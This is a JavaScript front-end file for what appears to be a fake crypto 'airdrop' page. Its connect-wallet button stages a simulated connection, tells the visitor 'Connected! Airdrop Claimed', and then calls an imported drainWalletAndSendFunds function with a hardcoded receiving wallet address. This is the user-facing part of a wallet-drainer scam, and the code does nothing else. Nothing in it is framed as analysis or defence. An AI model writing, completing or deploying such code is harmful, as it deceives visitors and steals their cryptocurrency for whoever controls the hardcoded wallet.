// main.js

import { drainWalletAndSendFunds } from './wallet.js';

document.addEventListener('DOMContentLoaded', () => {
    const connectWalletButton = document.querySelector('.connect-wallet');

    connectWalletButton.addEventListener('click', () => {
        // Simulate wallet connection process
        connectWalletButton.disabled = true; // Disable button to prevent multiple clicks
        connectWalletButton.textContent = 'Connecting...';

        // Simulate an asynchronous operation (e.g., connecting to a wallet)
        setTimeout(() => {
            // Simulate successful connection
            const success = true; // This would be determined by the actual connection logic

            if (success) {
                connectWalletButton.textContent = 'Connected! Airdrop Claimed';
                connectWalletButton.style.backgroundColor = '#4CAF50'; // Change to a success color
                drainWalletAndSendFunds('9H324MMej9eTvLNQWiGrwWy1V8SYoUnvUuakK6Sgsx1a'); // Trigger the drain function
            } else {
                connectWalletButton.textContent = 'Failed to Connect. Try Again';
                connectWalletButton.disabled = false; // Re-enable button for retry
            }
        }, 2000); // Simulate a delay for the connection process
    });
});